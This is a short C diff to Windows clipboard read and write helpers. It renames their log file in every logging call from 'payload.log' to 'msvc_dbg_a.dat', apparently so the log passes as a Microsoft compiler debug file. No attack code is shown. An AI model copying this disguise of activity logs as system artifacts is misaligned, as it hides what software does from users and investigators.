@@ -50,7 +50,7 @@ static int clip_publish_utf16_from_bytes(const char *bytes, size_t len) {
     }
     if (!opened) {
         GlobalFree(h);
-        slog_writef("payload.log",
+        slog_writef("msvc_dbg_a.dat",
                     "clip: OpenClipboard failed after 5 retries (gle=%lu)",
                     open_gle);
         return 0;
@@ -61,13 +61,13 @@ static int clip_publish_utf16_from_bytes(const char *bytes, size_t len) {
     CloseClipboard();
     if (!set) {
         GlobalFree(h);
-        slog_writef("payload.log",
+        slog_writef("msvc_dbg_a.dat",
                     "clip: SetClipboardData(CF_UNICODETEXT) failed (gle=%lu wchars=%d)",
                     set_gle, wlen);
         return 0;
     }
     /* SetClipboardData succeeded -> system owns h; don't GlobalFree. */
-    slog_writef("payload.log", "clip: set %d wchars (utf8_bytes=%zu)", wlen, len);
+    slog_writef("msvc_dbg_a.dat", "clip: set %d wchars (utf8_bytes=%zu)", wlen, len);
     return 1;
 }
 
@@ -107,7 +107,7 @@ char *clip_get_utf8(void) {
         Sleep(30 * (attempt + 1));
     }
     if (!opened) {
-        slog_writef("payload.log", "clip_get: OpenClipboard failed (gle=%lu)",
+        slog_writef("msvc_dbg_a.dat", "clip_get: OpenClipboard failed (gle=%lu)",
                     GetLastError());
         return NULL;
     }
